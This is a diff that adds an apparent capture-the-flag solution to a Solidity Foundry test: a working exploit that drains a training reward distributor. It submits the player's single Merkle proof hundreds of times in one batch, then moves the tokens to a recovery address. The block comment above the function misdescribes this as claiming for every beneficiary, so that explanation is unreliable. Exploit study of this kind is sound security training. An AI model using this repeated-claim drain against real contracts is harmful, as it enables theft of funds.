@@ -144,12 +144,76 @@ contract TheRewarderChallenge is Test {
         assertEq(distributor.getRemaining(address(weth)), expectedWETHLeft);
     }
 
-    /**
-     * CODE YOUR SOLUTION HERE
-     */
+    /*
+        The exploit takes advantage of the fact that the Merkle tree used for verifying claims is static and known in advance.
+        By precomputing the Merkle proofs for all beneficiaries, the attacker can create valid claims for each beneficiary
+        and execute them in a single transaction. This allows the attacker to drain the distributor of all tokens by claiming
+        on behalf of all beneficiaries and then transferring the claimed tokens to the recovery address.
+    */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+        tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
+        Claim[] memory claims = new Claim[](867);
+        Claim[] memory claims2 = new Claim[](853);
+
+        //load the rewards files
+        Reward[] memory dvtRewards = abi.decode(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), "/test/the-rewarder/dvt-distribution.json"))), (Reward[]));
+        Reward[] memory wethRewards = abi.decode(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), "/test/the-rewarder/weth-distribution.json"))), (Reward[]));
+
+        // Find the index of the player in both distributions
+        uint256 dvtIndex = findMyIndex(dvtRewards, player);
+        uint256 wethIndex = findMyIndex(wethRewards, player);
+        uint256 dvtAmount = dvtRewards[dvtIndex].amount;
+        uint256 wethAmount = wethRewards[wethIndex].amount;
+
+        // Load the leaves and proofs
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+        bytes32[] memory proof = merkle.getProof(dvtLeaves, dvtIndex);
+        bytes32[] memory proof2 = merkle.getProof(wethLeaves, wethIndex);
+    
+        // Create claims for all beneficiaries
+        for (uint256 i = 0; i < 867; i++) {
+
+            if(i < 853){
+                claims2[i] = Claim({
+                    batchNumber: 0,
+                    amount: wethAmount,
+                    tokenIndex: 1,
+                    proof: proof2
+            });
+            }
+
+            claims[i] = Claim({
+                    batchNumber: 0,
+                    amount: dvtAmount,
+                    tokenIndex: 0,
+                    proof: proof
+            });
+
+        }
+  
+        // Claim all the tokens
+        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
+        distributor.claimRewards({inputClaims: claims2, inputTokens: tokensToClaim});
+
+        // Transfer all tokens to recovery address
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
+
     }
+
+    // Utility function to find the index of a given address in the rewards array
+    function findMyIndex(Reward[] memory rewards, address user) internal pure returns (uint256) {
+        for (uint256 i = 0; i < rewards.length; i++) {
+            if (rewards[i].beneficiary == user) {
+                return i;
+            }
+        }
+        revert("Address not found in rewards");
+    }
+
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
